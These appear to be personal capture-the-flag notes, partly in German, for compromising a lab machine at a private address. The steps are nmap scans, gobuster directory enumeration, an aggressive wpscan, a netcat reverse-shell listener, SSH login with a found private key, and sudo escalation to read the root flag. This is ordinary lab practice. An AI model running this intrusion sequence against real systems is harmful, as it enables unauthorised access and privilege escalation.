  ifconfig
   nmap 192.168.1.0/24
   nmap -sCV 192.168.1.205
  gobuster dir -u 192.168.1.205 -w /usr/share/wordlists/dirb/common.txt
   
  gobuster dir -u 192.168.1.205/S3cr3t -w /usr/share/wordlists/dirb/common.txt
  
    wpscan --url http://192.168.1.205/S3cr3t --plugins-detection aggressive
    
    rlwrap -cArn nc -lvnp 5555

    zweite terminal 
         1 nano key   da lege ich das primary key das ich habe gefunden 
         denn ctrl+o  > enter   >ctrl+x 
         
         2 chmod 600 key
         
         3 ssh alpha@192.168.1.205 -i key  
         
         4 probiere :sudo -i    und wersuche mit was hab von passwords 
         wenn nicht passt ich komme zu :
          
  erste terminal suche ich das password 
  home -Documents  - Downloads ,
  jede file .txt ist intersant wenn ich finde das password versuch 
  1 sudo -i     jetzt bin ich der root 
  2  ls /root
  3   cat /root/root.txt
